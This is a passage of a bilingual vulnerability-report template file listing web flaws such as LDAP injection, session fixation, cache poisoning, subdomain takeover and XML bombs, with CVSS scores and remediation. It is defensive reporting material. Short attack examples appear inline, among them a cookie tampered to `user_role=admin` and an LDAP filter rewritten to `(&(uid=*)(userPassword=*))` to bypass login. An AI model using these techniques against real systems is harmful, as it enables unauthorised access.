    technicalDescription_es: 'El formulario de inicio de sesión de la aplicación envía las credenciales a través de HTTP en lugar de HTTPS. Un atacante en la misma red local o en cualquier punto a lo largo de la ruta de la red puede usar un sniffer de paquetes (como Wireshark) para capturar la solicitud POST y leer el nombre de usuario y la contraseña en texto claro.',
    affectedComponents_en: 'The login page at `http://[TODO example.com]/login`',
    affectedComponents_es: 'La página de inicio de sesión en `http://[TODO ejemplo.com]/login`',
    impact_en: 'Interception of credentials can lead to account takeover. Interception of session cookies can lead to session hijacking. This compromises user accounts and all data they have access to.',
    impact_es: 'La intercepción de credenciales puede conducir a la toma de control de la cuenta. La intercepción de cookies de sesión puede conducir al secuestro de la sesión. Esto compromete las cuentas de los usuarios y todos los datos a los que tienen acceso.',
    recommendations_en: 'Enforce the use of HTTPS for the entire application by implementing HTTP Strict Transport Security (HSTS). Redirect all HTTP requests to HTTPS.',
    recommendations_es: 'Hacer cumplir el uso de HTTPS para toda la aplicación implementando HTTP Strict Transport Security (HSTS). Redirigir todas las solicitudes HTTP a HTTPS.',
    details_en: '[TODO Provide a screenshot from a packet sniffing tool showing the credentials being transmitted in cleartext.]',
    details_es: '[TODO Proporcionar una captura de pantalla de una herramienta de sniffing de paquetes que muestre las credenciales transmitiéndose en texto claro.]',
    remediation_en: {
      shortTerm: 'Configure the web server to redirect all HTTP traffic to HTTPS.',
      mediumTerm: 'Implement the HTTP Strict Transport Security (HSTS) header to ensure the browser only connects to the application over HTTPS.',
      longTerm: 'Ensure all cookies, especially session cookies, are flagged with the `Secure` attribute.',
    },
    remediation_es: {
      shortTerm: 'Configurar el servidor web para redirigir todo el tráfico HTTP a HTTPS.',
      mediumTerm: 'Implementar la cabecera HTTP Strict Transport Security (HSTS) para garantizar que el navegador solo se conecte a la aplicación a través de HTTPS.',
      longTerm: 'Asegurarse de que todas las cookies, especialmente las cookies de sesión, estén marcadas con el atributo `Secure`.',
    },
    references: ['https://owasp.org/www-project-top-ten/2021/a02-cryptographic-failures'],
    tags: ['Cryptography', 'TLS/SSL'],
  },
  {
    id: 'vuln-039',
    title_en: 'Reliance on Untrusted Inputs in a Security Decision',
    title_es: 'Dependencia de Entradas no Confiables en una Decisión de Seguridad',
    cwe: 'CWE-807',
    severity: 'High',
    cvss: {
      score: 8.8,
      vectorString: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H',
      attackVector: 'Network',
      attackComplexity: 'Low',
      privilegesRequired: 'Low',
      userInteraction: 'None',
      scope: 'Unchanged',
      confidentiality: 'High',
      integrity: 'High',
      availability: 'High',
    },
    overview_en: 'The application makes a security-related decision (e.g., access control) based on a value that is controlled by the user, such as a hidden form field or a cookie.',
    overview_es: 'La aplicación toma una decisión relacionada con la seguridad (p. ej., control de acceso) basándose en un valor que es controlado por el usuario, como un campo de formulario oculto o una cookie.',
    technicalDescription_en: 'The application determines a user\'s privilege level based on a client-side parameter. For example, a cookie is set as `user_role=guest`. An attacker can modify this cookie to `user_role=admin` using browser developer tools and gain administrative privileges because the server blindly trusts the value supplied by the client.',
    technicalDescription_es: 'La aplicación determina el nivel de privilegio de un usuario basándose en un parámetro del lado del cliente. Por ejemplo, una cookie se establece como `user_role=guest`. Un atacante puede modificar esta cookie a `user_role=admin` usando las herramientas de desarrollador del navegador y obtener privilegios administrativos porque el servidor confía ciegamente en el valor suministrado por el cliente.',
    affectedComponents_en: '[TODO Specify the parameter and endpoint, e.g., The `user_role` cookie is trusted by all application endpoints.]',
    affectedComponents_es: '[TODO Especificar el parámetro y el endpoint, p. ej., La cookie `user_role` es confiada por todos los endpoints de la aplicación.]',
    impact_en: 'This can lead to a complete bypass of access controls, allowing attackers to gain administrative privileges and compromise the entire application.',
    impact_es: 'Esto puede conducir a una omisión completa de los controles de acceso, permitiendo a los atacantes obtener privilegios administrativos y comprometer toda la aplicación.',
    recommendations_en: 'Never trust client-side data for security decisions. All access control decisions must be made based on trusted, server-side information, such as the user\'s session data stored on the server.',
    recommendations_es: 'Nunca confiar en los datos del lado del cliente para las decisiones de seguridad. Todas las decisiones de control de acceso deben tomarse basándose en información confiable y del lado del servidor, como los datos de sesión del usuario almacenados en el servidor.',
    details_en: '[TODO Provide a PoC, showing the modified request (e.g., via Burp Suite) and the resulting privileged access.]',
    details_es: '[TODO Proporcionar un PoC, mostrando la solicitud modificada (p. ej., a través de Burp Suite) y el acceso privilegiado resultante.]',
    remediation_en: {
      shortTerm: 'Move the authorization logic to be purely server-side. Remove any reliance on client-side parameters for access control.',
      mediumTerm: 'Review the entire application to identify any instances where security decisions are based on user-controllable data.',
      longTerm: 'Implement a robust, centralized access control mechanism that is based on server-side session state.',
    },
    remediation_es: {
      shortTerm: 'Mover la lógica de autorización para que sea puramente del lado del servidor. Eliminar cualquier dependencia de los parámetros del lado del cliente para el control de acceso.',
      mediumTerm: 'Revisar toda la aplicación para identificar cualquier instancia en la que las decisiones de seguridad se basen en datos controlables por el usuario.',
      longTerm: 'Implementar un mecanismo de control de acceso robusto y centralizado que se base en el estado de la sesión del lado del servidor.',
    },
    references: ['https://cwe.mitre.org/data/definitions/807.html'],
    tags: ['Access Control'],
  },
  {
      id: 'vuln-040',
      title_en: 'LDAP Injection',
      title_es: 'Inyección LDAP',
      cwe: 'CWE-90',
      severity: 'High',
      cvss: {
          score: 8.8,
          vectorString: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H',
          attackVector: 'Network',
          attackComplexity: 'Low',
          privilegesRequired: 'Low',
          userInteraction: 'None',
          scope: 'Unchanged',
          confidentiality: 'High',
          integrity: 'High',
          availability: 'High',
      },
      overview_en: 'An attacker can execute arbitrary LDAP queries by injecting malicious data into an LDAP query. This can be used to bypass authentication or extract sensitive information from an LDAP directory.',
      overview_es: 'Un atacante puede ejecutar consultas LDAP arbitrarias inyectando datos maliciosos en una consulta LDAP. Esto puede usarse para eludir la autenticación o extraer información sensible de un directorio LDAP.',
      technicalDescription_en: 'The application constructs an LDAP query by concatenating user-supplied input. An attacker can provide input containing LDAP special characters (like `*`, `(`, `)`, `&`, `|`) to modify the structure and logic of the LDAP filter. For example, an attacker could change a filter from `(&(uid=username)(userPassword=password))` to `(&(uid=*)(userPassword=*))` to bypass authentication.',
      technicalDescription_es: 'La aplicación construye una consulta LDAP concatenando la entrada suministrada por el usuario. Un atacante puede proporcionar una entrada que contenga caracteres especiales de LDAP (como `*`, `(`, `)`, `&`, `|`) para modificar la estructura y la lógica del filtro LDAP. Por ejemplo, un atacante podría cambiar un filtro de `(&(uid=username)(userPassword=password))` a `(&(uid=*)(userPassword=*))` para eludir la autenticación.',
      affectedComponents_en: '[TODO Specify the vulnerable component, e.g., The login form that authenticates against an LDAP server.]',
      affectedComponents_es: '[TODO Especificar el componente vulnerable, p. ej., El formulario de inicio de sesión que se autentica contra un servidor LDAP.]',
      impact_en: 'LDAP injection can lead to authentication bypass, privilege escalation, and disclosure of all information within the LDAP directory, which often includes usernames, passwords, and other sensitive employee data.',
      impact_es: 'La inyección LDAP puede conducir a la elusión de la autenticación, la escalada de privilegios y la divulgación de toda la información dentro del directorio LDAP, que a menudo incluye nombres de usuario, contraseñas y otros datos sensibles de los empleados.',
      recommendations_en: 'Sanitize all user-supplied input before it is included in an LDAP query. Escape any characters that have special meaning in LDAP filters. Use a framework or library that provides safe, parameterized LDAP query APIs.',
      recommendations_es: 'Sanitizar todas las entradas suministradas por el usuario antes de que se incluyan en una consulta LDAP. Escapar cualquier caracter que tenga un significado especial en los filtros LDAP. Utilice un framework o librería que proporcione APIs de consulta LDAP seguras y parametrizadas.',
      details_en: '[TODO Provide a PoC payload, e.g., entering `*` as the username and password.]',
      details_es: '[TODO Proporcionar una carga útil de PoC, p. ej., ingresando `*` como nombre de usuario y contraseña.]',
      remediation_en: {
          shortTerm: 'Implement server-side input sanitization to escape LDAP metacharacters.',
          mediumTerm: 'Refactor the code to use a secure LDAP query framework that prevents injection.',
          longTerm: 'Minimize the privileges of the LDAP user account that the application uses to query the directory.',
      },
      remediation_es: {
          shortTerm: 'Implementar la sanitización de entradas del lado del servidor para escapar los metacaracteres de LDAP.',
          mediumTerm: 'Refactorizar el código para usar un framework de consultas LDAP seguro que prevenga la inyección.',
          longTerm: 'Minimizar los privilegios de la cuenta de usuario LDAP que la aplicación utiliza para consultar el directorio.',
      },
      references: ['https://owasp.org/www-community/attacks/LDAP_Injection'],
      tags: ['Injection', 'LDAP'],
  },
    {
      id: 'vuln-041',
      title_en: 'Insecure Password Reset',
      title_es: 'Restablecimiento de Contraseña Inseguro',
      cwe: 'CWE-640',
      severity: 'High',
      cvss: {
          score: 8.8,
          vectorString: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H',
          attackVector: 'Network',
          attackComplexity: 'Low',
          privilegesRequired: 'None',
          userInteraction: 'Required',
          scope: 'Unchanged',
          confidentiality: 'High',
          integrity: 'High',
          availability: 'High',
      },
      overview_en: 'The password reset functionality is insecure, allowing an attacker to reset the password for any user\'s account.',
      overview_es: 'La funcionalidad de restablecimiento de contraseña es insegura, lo que permite a un atacante restablecer la contraseña de la cuenta de cualquier usuario.',
      technicalDescription_en: '[TODO Be specific. Examples: The password reset token is predictable or has low entropy. The reset token is sent in the URL, leaking it via Referer headers. The application does not properly validate the token. The application asks security questions with weak or publicly known answers.]',
      technicalDescription_es: '[TODO Ser específico. Ejemplos: El token de restablecimiento de contraseña es predecible o tiene baja entropía. El token de reinicio se envía en la URL, filtrándolo a través de las cabeceras Referer. La aplicación no valida correctamente el token. La aplicación hace preguntas de seguridad con respuestas débiles o públicamente conocidas.]',
      affectedComponents_en: 'The password reset workflow.',
      affectedComponents_es: 'El flujo de trabajo de restablecimiento de contraseña.',
      impact_en: 'An attacker can gain unauthorized access to any user\'s account by resetting their password, leading to a full account takeover.',
      impact_es: 'Un atacante puede obtener acceso no autorizado a la cuenta de cualquier usuario restableciendo su contraseña, lo que lleva a una toma de control total de la cuenta.',
      recommendations_en: 'Use long, random, single-use tokens for password resets and send them in the body of an email, not in the URL. Expire tokens after a short period (e.g., 1 hour). Require the user to provide their old password if they are already logged in.',
      recommendations_es: 'Use tokens largos, aleatorios y de un solo uso para los restablecimientos de contraseña y envíelos en el cuerpo de un correo electrónico, no en la URL. Hacer que los tokens caduquen después de un corto período (p. ej., 1 hora). Requerir que el usuario proporcione su contraseña anterior si ya ha iniciado sesión.',
      details_en: '[TODO Provide a PoC, e.g., Show how a predictable token can be guessed to reset another user\'s password.]',
      details_es: '[TODO Proporcionar un PoC, p. ej., Mostrar cómo se puede adivinar un token predecible para restablecer la contraseña de otro usuario.]',
      remediation_en: {
          shortTerm: 'Ensure password reset tokens are generated using a cryptographically secure random number generator and have at least 128 bits of entropy.',
          mediumTerm: 'Invalidate password reset tokens immediately after they are used. Implement a short expiration time for all tokens.',
          longTerm: 'Notify the user via email whenever a password reset is initiated or completed for their account.',
      },
      remediation_es: {
          shortTerm: 'Asegurarse de que los tokens de restablecimiento de contraseña se generen utilizando un generador de números aleatorios criptográficamente seguro y tengan al menos 128 bits de entropía.',
          mediumTerm: 'Invalidar los tokens de restablecimiento de contraseña inmediatamente después de su uso. Implementar un tiempo de caducidad corto para todos los tokens.',
          longTerm: 'Notificar al usuario por correo electrónico cada vez que se inicie o complete un restablecimiento de contraseña para su cuenta.',
      },
      references: ['https://owasp.org/www-project-cheat-sheets/cheatsheets/Forgot_Password_Cheat_Sheet.html'],
      tags: ['Authentication', 'Passwords'],
    },
    {
      id: 'vuln-042',
      title_en: 'Clickjacking',
      title_es: 'Clickjacking',
      cwe: 'CWE-1021',
      severity: 'Medium',
      cvss: {
          score: 4.7,
          vectorString: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:L/A:N',
          attackVector: 'Network',
          attackComplexity: 'Low',
          privilegesRequired: 'None',
          userInteraction: 'Required',
          scope: 'Changed',
          confidentiality: 'None',
          integrity: 'Low',
          availability: 'None',
      },
      overview_en: 'An attacker can trick a user into clicking on something different from what the user perceives, potentially revealing confidential information or taking control of their computer while clicking on seemingly innocuous web pages.',
      overview_es: 'Un atacante puede engañar a un usuario para que haga clic en algo diferente de lo que el usuario percibe, revelando potencialmente información confidencial o tomando el control de su computadora mientras hace clic en páginas web aparentemente inocuas.',
      technicalDescription_en: 'The application does not include the `X-Frame-Options` or `Content-Security-Policy: frame-ancestors` headers in its HTTP responses. This allows an attacker to load the vulnerable page in a transparent `<iframe>` on top of a malicious website. The attacker can then socially engineer the user to click on buttons that appear to be part of the malicious site, but are actually interacting with the hidden, legitimate page.',
      technicalDescription_es: 'La aplicación no incluye las cabeceras `X-Frame-Options` o `Content-Security-Policy: frame-ancestors` en sus respuestas HTTP. Esto permite a un atacante cargar la página vulnerable en un `<iframe>` transparente sobre un sitio web malicioso. El atacante puede entonces usar ingeniería social para que el usuario haga clic en botones que parecen ser parte del sitio malicioso, pero que en realidad están interactuando con la página legítima oculta.',
      affectedComponents_en: 'All pages of the application that can be framed.',
      affectedComponents_es: 'Todas las páginas de la aplicación que pueden ser enmarcadas.',
      impact_en: 'Clickjacking can be used to trick users into performing sensitive actions they did not intend to, such as deleting their account, changing permissions, or transferring funds.',
      impact_es: 'El clickjacking puede usarse para engañar a los usuarios para que realicen acciones sensibles que no tenían la intención de hacer, como eliminar su cuenta, cambiar permisos o transferir fondos.',
      recommendations_en: 'The most effective defense is to implement the `X-Frame-Options: DENY` or `Content-Security-Policy: frame-ancestors \'none\'` HTTP headers to prevent the site from being loaded in an iframe.',
      recommendations_es: 'La defensa más efectiva es implementar las cabeceras HTTP `X-Frame-Options: DENY` o `Content-Security-Policy: frame-ancestors \'none\'` para evitar que el sitio se cargue en un iframe.',
      details_en: '[TODO Provide a PoC HTML page that demonstrates the clickjacking attack.]',
      details_es: '[TODO Proporcionar una página HTML de PoC que demuestre el ataque de clickjacking.]',
      remediation_en: {
          shortTerm: 'Implement the `X-Frame-Options: DENY` header across the entire application.',
          mediumTerm: 'Implement a strict `Content-Security-Policy` with the `frame-ancestors \'self\'` or `frame-ancestors \'none\'` directive.',
          longTerm: 'For any components that must be frameable, use a "frame-busting" JavaScript snippet as a defense-in-depth measure.',
      },
      remediation_es: {
          shortTerm: 'Implementar la cabecera `X-Frame-Options: DENY` en toda la aplicación.',
          mediumTerm: 'Implementar una `Content-Security-Policy` estricta con la directiva `frame-ancestors \'self\'` o `frame-ancestors \'none\'`.',
          longTerm: 'Para cualquier componente que deba ser enmarcable, utilice un fragmento de JavaScript "frame-busting" como medida de defensa en profundidad.',
      },
      references: ['https://owasp.org/www-community/attacks/Clickjacking'],
      tags: ['Clickjacking', 'UI Redressing'],
    },
    {
      id: 'vuln-043',
      title_en: 'Session Fixation',
      title_es: 'Fijación de Sesión',
      cwe: 'CWE-384',
      severity: 'Medium',
      cvss: {
          score: 6.8,
          vectorString: 'CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:L/A:N',
          attackVector: 'Network',
          attackComplexity: 'High',
          privilegesRequired: 'None',
          userInteraction: 'Required',
          scope: 'Unchanged',
          confidentiality: 'High',
          integrity: 'Low',
          availability: 'None',
      },
      overview_en: 'An attacker can force a user\'s session ID to a known value. After the user logs in, the attacker can use the same session ID to hijack the user\'s session.',
      overview_es: 'Un atacante puede forzar el ID de sesión de un usuario a un valor conocido. Después de que el usuario inicia sesión, el atacante puede usar el mismo ID de sesión para secuestrar la sesión del usuario.',
      technicalDescription_en: 'The application fails to generate a new session ID for the user upon successful authentication. An attacker can first visit the site to obtain a valid session ID. They then trick the victim into authenticating using that same session ID (e.g., by sending them a link like `https://example.com?sessionid=...`). Once the victim logs in, the attacker, who knows the session ID, has access to the authenticated session.',
      technicalDescription_es: 'La aplicación no genera un nuevo ID de sesión para el usuario tras una autenticación exitosa. Un atacante puede visitar primero el sitio para obtener un ID de sesión válido. Luego, engaña a la víctima para que se autentique usando ese mismo ID de sesión (p. ej., enviándole un enlace como `https://example.com?sessionid=...`). Una vez que la víctima inicia sesión, el atacante, que conoce el ID de sesión, tiene acceso a la sesión autenticada.',
      affectedComponents_en: 'The session management and authentication process.',
      affectedComponents_es: 'El proceso de gestión de sesiones y autenticación.',
      impact_en: 'Session fixation can lead to session hijacking, allowing an attacker to impersonate the victim and perform any actions they are authorized to do.',
      impact_es: 'La fijación de sesión puede conducir al secuestro de la sesión, permitiendo a un atacante hacerse pasar por la víctima y realizar cualquier acción que esté autorizada a hacer.',
      recommendations_en: 'Regenerate the session ID immediately after a user successfully authenticates. Do not accept session identifiers from URL parameters.',
      recommendations_es: 'Regenerar el ID de sesión inmediatamente después de que un usuario se autentique con éxito. No aceptar identificadores de sesión de los parámetros de la URL.',
      details_en: '[TODO Provide a step-by-step PoC of the attack.]',
      details_es: '[TODO Proporcionar un PoC paso a paso del ataque.]',
      remediation_en: {
          shortTerm: 'Call the session regeneration function immediately after a successful login.',
          mediumTerm: 'Configure the application to only accept session identifiers from cookies, not from GET/POST parameters.',
          longTerm: 'Implement additional session hijacking protections, such as tying the session to the user\'s IP address (with care for mobile users).',
      },
      remediation_es: {
          shortTerm: 'Llamar a la función de regeneración de sesión inmediatamente después de un inicio de sesión exitoso.',
          mediumTerm: 'Configurar la aplicación para que solo acepte identificadores de sesión de las cookies, no de los parámetros GET/POST.',
          longTerm: 'Implementar protecciones adicionales contra el secuestro de sesión, como vincular la sesión a la dirección IP del usuario (con cuidado para los usuarios móviles).',
      },
      references: ['https://owasp.org/www-community/attacks/Session_fixation'],
      tags: ['Session Management', 'Authentication'],
    },
    {
      id: 'vuln-044',
      title_en: 'Cache Poisoning',
      title_es: 'Envenenamiento de Caché (Cache Poisoning)',
      cwe: 'CWE-444',
      severity: 'High',
      cvss: {
          score: 8.2,
          vectorString: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:H/A:L',
          attackVector: 'Network',
          attackComplexity: 'Low',
          privilegesRequired: 'None',
          userInteraction: 'Required',
          scope: 'Changed',
          confidentiality: 'Low',
          integrity: 'High',
          availability: 'Low',
      },
      overview_en: 'An attacker can manipulate a web cache (e.g., a CDN or proxy) into storing a malicious response. This malicious response is then served to other users who request the same resource.',
      overview_es: 'Un atacante puede manipular una caché web (p. ej., una CDN o un proxy) para que almacene una respuesta maliciosa. Esta respuesta maliciosa se sirve luego a otros usuarios que solicitan el mismo recurso.',
      technicalDescription_en: 'The application includes unkeyed inputs (like certain HTTP headers) in the HTTP response. An attacker can send a request with a malicious payload in an unkeyed header. The cache stores the malicious response and serves it to all users who request that URL, because the cache key (typically just the URL) is the same. This can be used to deliver XSS payloads to a wide audience.',
      technicalDescription_es: 'La aplicación incluye entradas no clave (como ciertas cabeceras HTTP) en la respuesta HTTP. Un atacante puede enviar una solicitud con una carga útil maliciosa en una cabecera no clave. La caché almacena la respuesta maliciosa y la sirve a todos los usuarios que solicitan esa URL, porque la clave de caché (generalmente solo la URL) es la misma. Esto puede usarse para entregar cargas útiles de XSS a una amplia audiencia.',
      affectedComponents_en: 'Any part of the application that is behind a web cache.',
      affectedComponents_es: 'Cualquier parte de la aplicación que esté detrás de una caché web.',
      impact_en: 'Cache poisoning can lead to widespread XSS attacks, session hijacking, or website defacement. A single attack can impact thousands of users.',
      impact_es: 'El envenenamiento de caché puede conducir a ataques de XSS generalizados, secuestro de sesiones o desfiguración de sitios web. Un solo ataque puede afectar a miles de usuarios.',
      recommendations_en: 'Configure the cache to only include whitelisted, keyed inputs in the cache key. Disable caching for dynamic or user-specific content. Be aware of all headers that can affect the response.',
      recommendations_es: 'Configurar la caché para que solo incluya entradas clave y en lista blanca en la clave de caché. Deshabilitar el almacenamiento en caché para contenido dinámico o específico del usuario. Estar al tanto de todas las cabeceras que pueden afectar la respuesta.',
      details_en: '[TODO Provide a PoC request that poisons the cache. This is highly technical and depends on the specific caching behavior.]',
      details_es: '[TODO Proporcionar una solicitud de PoC que envenene la caché. Esto es muy técnico y depende del comportamiento específico del almacenamiento en caché.]',
      remediation_en: {
          shortTerm: 'Identify and remove the use of unkeyed headers in the application\'s response generation.',
          mediumTerm: 'Explicitly configure the caching server to only use a minimal set of headers (like `Accept-Language`) as part of the cache key.',
          longTerm: 'Strictly separate static and dynamic content. Only cache purely static assets.',
      },
      remediation_es: {
          shortTerm: 'Identificar y eliminar el uso de cabeceras no clave en la generación de respuestas de la aplicación.',
          mediumTerm: 'Configurar explícitamente el servidor de caché para que solo utilice un conjunto mínimo de cabeceras (como `Accept-Language`) como parte de la clave de caché.',
          longTerm: 'Separar estrictamente el contenido estático y dinámico. Almacenar en caché solo los activos puramente estáticos.',
      },
      references: ['https://portswigger.net/web-security/web-cache-poisoning'],
      tags: ['Cache Poisoning'],
    },
    {
      id: 'vuln-045',
      title_en: 'Subdomain Takeover',
      title_es: 'Toma de Control de Subdominio (Subdomain Takeover)',
      cwe: 'CWE-350',
      severity: 'High',
      cvss: {
          score: 7.2,
          vectorString: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:L',
          attackVector: 'Network',
          attackComplexity: 'Low',
          privilegesRequired: 'None',
          userInteraction: 'Required',
          scope: 'Changed',
          confidentiality: 'Low',
          integrity: 'Low',
          availability: 'Low',
      },
      overview_en: 'An attacker can take control of one of the organization\'s subdomains. This is possible when a subdomain has a DNS record (e.g., a CNAME) pointing to a third-party service, but the service is no longer in use or has been deprovisioned.',
      overview_es: 'Un atacante puede tomar el control de uno de los subdominios de la organización. Esto es posible cuando un subdominio tiene un registro DNS (p. ej., un CNAME) que apunta a un servicio de terceros, pero el servicio ya no está en uso o ha sido desaprovisionado.',
      technicalDescription_en: 'A subdomain, such as `blog.example.com`, has a CNAME record pointing to an external service like `example.github.io`. However, the `example` GitHub Pages site has been deleted. An attacker can create a GitHub account, create a repository named `example`, and publish their own content to `example.github.io`. They now control the content served at `blog.example.com`.',
      technicalDescription_es: 'Un subdominio, como `blog.example.com`, tiene un registro CNAME que apunta a un servicio externo como `example.github.io`. Sin embargo, el sitio de GitHub Pages `example` ha sido eliminado. Un atacante puede crear una cuenta de GitHub, crear un repositorio llamado `example` y publicar su propio contenido en `example.github.io`. Ahora controla el contenido que se sirve en `blog.example.com`.',
      affectedComponents_en: 'The subdomain [TODO `subdomain.example.com`] is vulnerable to takeover.',
      affectedComponents_es: 'El subdominio [TODO `subdominio.example.com`] es vulnerable a la toma de control.',
      impact_en: 'An attacker can use the hijacked subdomain to host malicious content, conduct phishing attacks, and steal cookies scoped to the parent domain. This poses a significant reputational and security risk.',
      impact_es: 'Un atacante puede usar el subdominio secuestrado para alojar contenido malicioso, realizar ataques de phishing y robar cookies con alcance al dominio principal. Esto representa un riesgo significativo para la reputación y la seguridad.',
      recommendations_en: 'Regularly audit all DNS records to identify and remove any CNAME, A, or other records that point to deprovisioned or unused services. Implement a process to remove DNS records when a third-party service is decommissioned.',
      recommendations_es: 'Auditar regularmente todos los registros DNS para identificar y eliminar cualquier registro CNAME, A u otro que apunte a servicios desaprovisionados o no utilizados. Implementar un proceso para eliminar los registros DNS cuando se da de baja un servicio de terceros.',
      details_en: '[TODO Provide the output of a DNS query and a screenshot showing the "service not found" page from the third-party provider.]',
      details_es: '[TODO Proporcionar la salida de una consulta DNS y una captura de pantalla que muestre la página "servicio no encontrado" del proveedor de terceros.]',
      remediation_en: {
          shortTerm: 'Immediately remove the dangling DNS record for the affected subdomain.',
          mediumTerm: 'Perform a comprehensive audit of all DNS records to find other potential takeover vulnerabilities.',
          longTerm: 'Integrate DNS record management into the infrastructure decommissioning process.',
      },
      remediation_es: {
          shortTerm: 'Eliminar inmediatamente el registro DNS colgante para el subdominio afectado.',
          mediumTerm: 'Realizar una auditoría exhaustiva de todos los registros DNS para encontrar otras posibles vulnerabilidades de toma de control.',
          longTerm: 'Integrar la gestión de registros DNS en el proceso de desmantelamiento de la infraestructura.',
      },
      references: ['https://github.com/EdOverflow/can-i-take-over-xyz'],
      tags: ['Subdomain Takeover', 'DNS'],
  },
    {
        id: 'vuln-046',
        title_en: 'Insecure Object-Relational Mapping (ORM) Configuration',
        title_es: 'Configuración Insegura de Mapeo Objeto-Relacional (ORM)',
        cwe: 'CWE-915',
        severity: 'Medium',
        cvss: {
            score: 6.5,
            vectorString: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N',
            attackVector: 'Network',
            attackComplexity: 'Low',
            privilegesRequired: 'Low',
            userInteraction: 'None',
            scope: 'Unchanged',
            confidentiality: 'High',
            integrity: 'None',
            availability: 'None',
        },
        overview_en: 'The application\'s ORM is configured in a way that allows attackers to access or manipulate data beyond their intended permissions, often by exploiting flexible query language features.',
        overview_es: 'El ORM de la aplicación está configurado de una manera que permite a los atacantes acceder o manipular datos más allá de sus permisos previstos, a menudo explotando características flexibles del lenguaje de consulta.',
        technicalDescription_en: 'The application uses an ORM and allows user-supplied data to directly influence query construction without proper validation. For example, a user might be able to control field names or sorting parameters, allowing them to sort by a sensitive field (like a password hash) and infer its value through side-channel attacks (e.g., timing differences).',
        technicalDescription_es: 'La aplicación utiliza un ORM y permite que los datos suministrados por el usuario influyan directamente en la construcción de la consulta sin una validación adecuada. Por ejemplo, un usuario podría controlar los nombres de los campos o los parámetros de ordenación, lo que le permite ordenar por un campo sensible (como un hash de contraseña) e inferir su valor a través de ataques de canal lateral (p. ej., diferencias de tiempo).',
        affectedComponents_en: '[TODO Specify the API endpoint and parameters that are vulnerable, e.g., the `sort_by` parameter in the `/api/users` endpoint.]',
        affectedComponents_es: '[TODO Especificar el endpoint de la API y los parámetros que son vulnerables, p. ej., el parámetro `sort_by` en el endpoint `/api/users`.]',
        impact_en: 'Insecure ORM configuration can lead to information disclosure and, in some cases, authorization bypass. It expands the attack surface for injection-style vulnerabilities.',
        impact_es: 'La configuración insegura del ORM puede conducir a la divulgación de información y, en algunos casos, a la omisión de la autorización. Expande la superficie de ataque para vulnerabilidades de tipo inyección.',
        recommendations_en: 'Strictly validate all user input used in ORM queries. Use a whitelist approach for any parameters that control query structure, such as field names or sort orders. Avoid exposing sensitive model properties through the ORM.',
        recommendations_es: 'Validar estrictamente todas las entradas del usuario utilizadas en las consultas ORM. Utilice un enfoque de lista blanca para cualquier parámetro que controle la estructura de la consulta, como nombres de campos u órdenes de clasificación. Evite exponer propiedades sensibles del modelo a través del ORM.',
        details_en: '[TODO Provide a PoC request showing how user input can manipulate the query.]',
        details_es: '[TODO Proporcionar una solicitud de PoC que muestre cómo la entrada del usuario puede manipular la consulta.]',
        remediation_en: {
            shortTerm: 'Implement a strict whitelist for all parameters that influence the ORM query structure on the affected endpoint.',
            mediumTerm: 'Review all data access points that use the ORM to ensure that user input is properly validated.',
            longTerm: 'Use DTOs (Data Transfer Objects) to separate the application\'s internal domain models from the data exposed to clients.',
        },
        remediation_es: {
            shortTerm: 'Implementar una lista blanca estricta para todos los parámetros que influyen en la estructura de la consulta ORM en el endpoint afectado.',
            mediumTerm: 'Revisar todos los puntos de acceso a datos que utilizan el ORM para asegurarse de que la entrada del usuario se valida correctamente.',
            longTerm: 'Usar DTOs (Data Transfer Objects) para separar los modelos de dominio internos de la aplicación de los datos expuestos a los clientes.',
        },
        references: ['https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html'],
        tags: ['ORM', 'Injection'],
    },
    {
        id: 'vuln-047',
        title_en: 'XML Bomb (Billion Laughs Attack)',
        title_es: 'Bomba XML (Ataque "Billion Laughs")',
        cwe: 'CWE-776',
        severity: 'Medium',
        cvss: {
            score: 5.3,
            vectorString: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L',
            attackVector: 'Network',
            attackComplexity: 'Low',
            privilegesRequired: 'None',
            userInteraction: 'None',
            scope: 'Unchanged',
            confidentiality: 'None',
            integrity: 'None',
            availability: 'Low',
        },
        overview_en: 'An attacker can cause a denial of service (DoS) by sending a small, specially crafted XML file that expands exponentially in memory when parsed.',
        overview_es: 'Un atacante puede causar una denegación de servicio (DoS) enviando un pequeño archivo XML especialmente diseñado que se expande exponencialmente en la memoria cuando se analiza.',
        technicalDescription_en: 'The application parses XML files from an untrusted source. An attacker can submit an XML document that uses a nested entity structure. For example, an entity `&lol9;` is defined as ten `&lol8;` entities, `&lol8;` is ten `&lol7;` entities, and so on. When the parser tries to resolve the top-level entity, it results in an exponential expansion that consumes a massive amount of memory and CPU, crashing the server.',
        technicalDescription_es: 'La aplicación analiza archivos XML de una fuente no confiable. Un atacante puede enviar un documento XML que utiliza una estructura de entidad anidada. Por ejemplo, una entidad `&lol9;` se define como diez entidades `&lol8;`, `&lol8;` es diez entidades `&lol7;`, y así sucesivamente. Cuando el analizador intenta resolver la entidad de nivel superior, se produce una expansión exponencial que consume una cantidad masiva de memoria y CPU, bloqueando el servidor.',
        affectedComponents_en: '[TODO Specify the functionality that parses XML, e.g., a file upload feature.]',
        affectedComponents_es: '[TODO Especificar la funcionalidad que analiza XML, p. ej., una función de carga de archivos.]',
        impact_en: 'This attack can cause a denial of service, making the application unavailable to legitimate users.',
        impact_es: 'Este ataque puede causar una denegación de servicio, haciendo que la aplicación no esté disponible para los usuarios legítimos.',
        recommendations_en: 'Configure the XML parser to disable or limit entity expansion. Most modern XML parsers have settings to mitigate this attack.',
        recommendations_es: 'Configurar el analizador XML para deshabilitar o limitar la expansión de entidades. La mayoría de los analizadores XML modernos tienen configuraciones para mitigar este ataque.',
        details_en: '[TODO Provide the "billion laughs" XML payload as a PoC.]',
        details_es: '[TODO Proporcionar la carga útil XML "billion laughs" como PoC.]',
        remediation_en: {
            shortTerm: 'Disable DTD (Document Type Definition) processing in the XML parser.',
